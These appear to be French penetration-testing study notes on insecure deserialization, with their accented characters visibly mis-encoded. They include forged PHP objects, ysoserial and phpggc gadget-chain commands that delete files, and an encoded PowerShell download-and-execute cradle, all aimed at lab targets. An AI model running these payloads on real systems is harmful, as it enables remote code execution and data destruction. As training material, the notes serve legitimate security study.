
La d√©s√©rialisation est le processus inverse de la s√©rialisation. Elle implique la conversion de donn√©es d'un format s√©rialis√© (comme JSON, XML ou Protobuf) en sa structure de donn√©es d'origine, souvent un objet en m√©moire.


[[#Identifier une d√©s√©rialisation non s√©curis√©e]]
[[#Exploitation]]


---

# Identifier une d√©s√©rialisation non s√©curis√©e

> [!TIP]
> Que ce soit en Blackbox ou Whitebox, chercher √† identifier les donn√©es pass√©es √† l'application qui ressemblent √† des donn√©es s√©rialis√©es.


[[#PHP serialization format]]
[[#JAVA serialization format]]

## PHP serialization format

Humainement lisible, En PHP, les lettres repr√©sentent le type de donn√©e et les nombres la longueur de chaque entr√©e.

Exemple avec objet user :

Donn√©es non s√©rialis√©es :

```
$user->name = "carlos";
$user->isLoggedIn = true;
```

Equivalent s√©rialis√© :

```
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

- `O:4:"User"`¬†- An object with the 4-character class name¬†`"User"`
- `2`¬†- the object has 2 attributes
- `s:4:"name"`¬†- The key of the first attribute is the 4-character string¬†`"name"`
- `s:6:"carlos"`¬†- The value of the first attribute is the 6-character string¬†`"carlos"`
- `s:10:"isLoggedIn"`¬†- The key of the second attribute is the 10-character string¬†`"isLoggedIn"`
- `b:1`¬†- The value of the second attribute is the boolean value¬†`true`


> [!TIP]
> Identifier les m√©thodes natives serialize() et unserialize() si acc√®s au code source.


## JAVA serialization format

Format de s√©rialisation binaire difficile √† lire.
Commence toujours par le m√™me octet -> ``ac ed`` en hexa et ``rO0`` en base64.

Si acc√®s au code source, voir les classes qui impl√©mentent l'interface ``java.io.Serializable``, elles peuvent s√©rialiser et d√©s√©rialiser les donn√©es. Identifier √©galement l'utilisation de la m√©thode ``readObject()``, qui est utilis√©e pour lire et d√©s√©rialiser les donn√©es depuis un ``InputStream``.

---

# Exploitation

- [[#Manipuler les objets serialis√©s]]
- [[#Magic Methods]]
- [[#Injection d'objets arbitraire]]
- [[#Gadget Chains]]

## Manipuler les objets s√©rialis√©s

- [[#Modifier les attributs de l'objet / type de donn√©es]]

### Modifier les attributs de l'objet / type de donn√©es

#### Modifier les attributs de l'objet

Simplement d√©coder les donn√©es envoy√©es au serveur et modifier des attributs potentiellement int√©ressants tel que que les bool√©ens "isAdmin" etc...

#### Modifier le type de donn√©es

PHP particuli√®rement vuln√©rable √† cause de l'operateur de comparaison ==
Par exemple `"5" == 5` -> PHP cherche √† convertir le string "5" en entier. Idem pour un string qui commence par un nombre -> `5 == "5 of something"` -> `5 == 5` ("of something" est ignor√©).

Dans php <= 7.X , `0 == "Exemple string"` retourne True, PHP traite le string comme un entier 0.

Pour les donn√©es serialis√©es suivantes en cookie :

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"blablabla";}
```

Modifier le type string pour l'access_token en entier 0, et le username administrator peut permettre de bypass l'authentification (penser √† modifier la longueur du string qui correspond √† administrator) :

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

> [!TIP]
> Utiliser l'extension Hackvertor dans BURP pour modifier directement les formats binaires.


## Magic Methods

Ne n√©cessitent pas d'√™tre invoqu√©es directement, elles sont appel√©es automatiquement lors d'un √©v√®nement.

#### PHP 

https://www.php.net/manual/en/language.oop5.magic.php

- `__construct()` ‚Üí initialisation automatique.
    
- `__destruct()` ‚Üí s‚Äôex√©cute √† la fin de l‚Äôobjet ‚Üí souvent utilis√© pour log / flush / write ‚Üí exploitable.
    
- `__wakeup()` ‚Üí d√©clench√© √† la **d√©s√©rialisation** ‚Üí entr√©e parfaite pour gadget chain.
    
- `__toString()` ‚Üí conversion automatique en string ‚Üí parfois cha√Æn√© avec `echo` / `print`.
    
- `__call()` / `__callStatic()` ‚Üí invoqu√©s si m√©thode inexistante ‚Üí peut rediriger vers autre chose.
    
- `__get()` / `__set()` ‚Üí interception d‚Äôacc√®s aux propri√©t√©s ‚Üí utile pour cha√Æner.

#### Python

- `__init__`



M√©thodes invoqu√©es automatiquement lors du processus de d√©s√©rialisation

- PHP -> `__wakeup()`
- JAVA -> `ObjectInputStream.readObject()`


## Injection d'objets arbitraire

Si possible de manipuler quelle classe d'objet est pass√©e en tant que donn√©es s√©rialis√©es, possible d'influencer le code ex√©cut√© pendant et apr√®s la d√©s√©rialisation.
L'objet n'a pas besoin d'√™tre de la classe attendue, cela peut causer une exeption dans la logique de l'application mais ex√©cuter le code tout de m√™me.
Si acc√®s au code source, rep√©rer l'utilisation des magic m√©thodes de d√©s√©rialisation dans les classes, puis check si des op√©rations dangereuses sont effectu√©es avec.

exemple avec code source PHP:

Ici nous avons une classe CustomTemplate qui permet d'instancier des objets donc de type CustomTemplate avec pour attributs template_file_path et lock_file_path. Nous pouvons voir l'utilisation de la fonction unlink dans la methode magic `__destruct`, ayant pour cons√©quence de supprimer le fichier indiqu√© dans lock_file_path s'il existe d√©ja.

```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Nous pouvons cr√©er un objet serialis√© de type CustomTemplate et y pr√©ciser un lock_file_path pointant vers n'importe quel fichier existant, il sera alors supprim√©.

```
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
```

## Gadget Chains

Gadget = morceau de code existant dans l'application.
L'objectif est d'invoquer une m√©thode qui passera les donn√©es en entr√©e √† une autre m√©thode et ainsi de suite.

- [[#Gadget Chains pr√©-construites]]
- [[#Gadget Chains document√©s]]
- [[#Cr√©er une Gadget chain from scratch]]

### Gadget Chains pr√©-construites

Tools :
- Java -> [ysoserial](https://github.com/frohoff/ysoserial)
- .NET -> [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- PHP -> [phpgcc](https://github.com/ambionics/phpggc)

#### JAVA

- ysoserial -> Cr√©er des gadget chains automatiquement pour une libraire cible avec une commande √† executer. (https://github.com/frohoff/ysoserial)

```sh
java -jar ysoserial-all.jar
```

###### URLDNS

URLDNS permet de trigger un DNS lookup sur la target (voir avec interactsh). Gadget chain la plus universelle pour d√©tecter si la vulnerabilit√© est pr√©sente.

Java <16

```sh
java -jar ysoserial-all.jar URLDNS 'http://oqlsqepxbemfmyqfdkirfo8u03vd0jt8u.oast.fun'
```

Java 16+

```sh
java --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED -jar ysoserial-all.jar URLDNS 'http://oqlsqepxbemfmyqfdkirfo8u03vd0jt8u.oast.fun'
```


###### JRMPClient

Autre moyen pour la d√©tection, celui ci se base sur une adresse IP afin d'√©tablir une connexion TCP. Tester 127.0.0.1 en premier et voir temps de reponse, puis sur une ip externe ayant un firewall. Si temps de reponse plus long alors vulnerable.


Java <16

```sh
java -jar ysoserial-all.jar JRMPClient '127.0.0.1' 
```

Java 16+

```sh
java --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.server=ALL-UNNAMED -jar ysoserial-all.jar JRMPClient '127.0.0.1' 
```

###### CommonsCollections

Exploite les gadget chains pr√©sentes dans les CommonsCollections.

Java <16

```sh
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'
```

Java 16+

CommonsCollections 1

```sh
java --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 'rm /home/carlos/morale.txt'
```

CommonsCollections 2 / 4

```sh
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections2 'rm /home/carlos/morale.txt'
```

CommonsCollections 3

```sh
java --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections3 'rm /home/carlos/morale.txt'
```

CommonsCollections 6

```sh
java --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 'rm /home/carlos/morale.txt'
```

CommonsCollections 7

```sh
java -jar ysoserial-all.jar CommonsCollections7 'rm /home/carlos/morale.txt'
```



#### PHP

- PHPGCC -> Equivalent de ysoserial pour PHP  https://github.com/ambionics/phpggc


```sh
./phpggc -l
```

```sh
./phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```


#### .NET

Exemple avec application .NET vuln√©rable. Ici la fonction d√©s√©rialise le fichier en entr√©e avec la m√©thode BinaryFormatter qui est vuln√©rable.

![[Pasted image 20250913214740.png]]

G√©n√©rer l'objet s√©rialis√© sur notre machine

```
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin
```

Upload le fichier sur la target

```
cd C:\Temp
upload C:\Payloads\data.bin
```



### Gadget Chains document√©s

Si pas de Gadget Chains pr√©-construites, rechercher des gadgets chains sur internet.

```
ruby deserialization gadget chain
```


### Cr√©er une Gadget Chain from scratch

Si les Gadget Chains pr√©-construites et les Gadget Chains document√©s ne donnent rien, cr√©er son propre exploit.

L'Ideal est d'avoir acc√®s au code source afin d'identifier une magic method invoqu√©e au cours de la d√©s√©rialisation.

- Le code ex√©cut√© fait-il quelque chose de dangereux avec la data contr√¥lable ?
- Sinon, est-ce le cas des autres m√©thodes invoqu√©es par la m√©thode ?

R√©p√©ter ce processus en gardant de vue les valeurs auxquelles nous avons acc√®s tout du long.

Le plus simple est de cr√©er son propre code pour g√©n√©rer et s√©rialiser les donn√©es sois m√™me plut√¥t que de modifier les objets existants (dans le cas d'un format binaire).

Code pour g√©n√©rer des objets s√©rialis√©s en JAVA -> https://github.com/PortSwigger/serialization-examples/tree/master

#### PHP

##### üîë 1. M√©thodes magiques √† spotter en priorit√©

Quand tu vois √ßa ‚Üí **alerte gadget possible** :

- `__construct()` ‚Üí initialisation automatique lors de la cr√©ation d'un objet de classe.
    
- `__destruct()` ‚Üí s‚Äôex√©cute √† la fin de l‚Äôobjet ‚Üí souvent utilis√© pour log / flush / write ‚Üí exploitable.
    
- `__wakeup()` ‚Üí d√©clench√© √† la **d√©s√©rialisation** ‚Üí entr√©e parfaite pour gadget chain.
    
- `__toString()` ‚Üí conversion automatique en string ‚Üí parfois cha√Æn√© avec `echo` / `print`.
    
- `__call()` / `__callStatic()` ‚Üí invoqu√©s si m√©thode inexistante ‚Üí peut rediriger vers autre chose.
    
- `__get()` / `__set()` ‚Üí interception d‚Äôacc√®s aux propri√©t√©s ‚Üí utile pour cha√Æner.
    

##### ‚ö†Ô∏è 2. Fonctions dangereuses √† surveiller

Si une cha√Æne atteint ces fonctions, c‚Äôest jackpot :

- **Ex√©cution OS** : `system`, `exec`, `passthru`, `shell_exec`, `popen`.
    
- **√âvaluation PHP** : `eval`, `assert` (ancienne version).
    
- **Chargement dynamique** : `include`, `require`, `include_once`, `require_once`.
    
- **S√©rialisation** : `unserialize`, `serialize` (check si entr√©e utilisateur passe dedans).
    
- **Manipulation fichiers** : `file_put_contents`, `fwrite`, `unlink`, `move_uploaded_file`.
    
- **Appels dynamiques** : `call_user_func`, `call_user_func_array`.
    
- **preg_replace** avec le modificateur `e` (<= PHP 5.5, encore pr√©sent dans vieux projets).

##### üîç 3. Patterns de gadgets fr√©quents

- **Destructeurs qui loggent** :
    
```
function __destruct() {     
	file_put_contents($this->file, $this->data); 
}
```
    
    üëâ Si `$file` et `$data` sont contr√¥lables ‚Üí RCE ou file write.
    
- **Chaine via `__toString()`** :
    
```
function __toString() {
     return $this->logger->log($this->msg);
}
```
    
    üëâ Si `$logger` est un objet externe ‚Üí cha√Ænage vers sa m√©thode `log`.
    
- **Utilisation de call_user_func** :
    
```
call_user_func($this->callback, $this->param);
```
    
    üëâ Si `$callback` est contr√¥lable ‚Üí execution de fonction arbitraire.
    
- **Wrapper `phar://`** (souvent via `file_exists`, `is_file`, `fopen`) ‚Üí peut d√©clencher `unserialize` interne.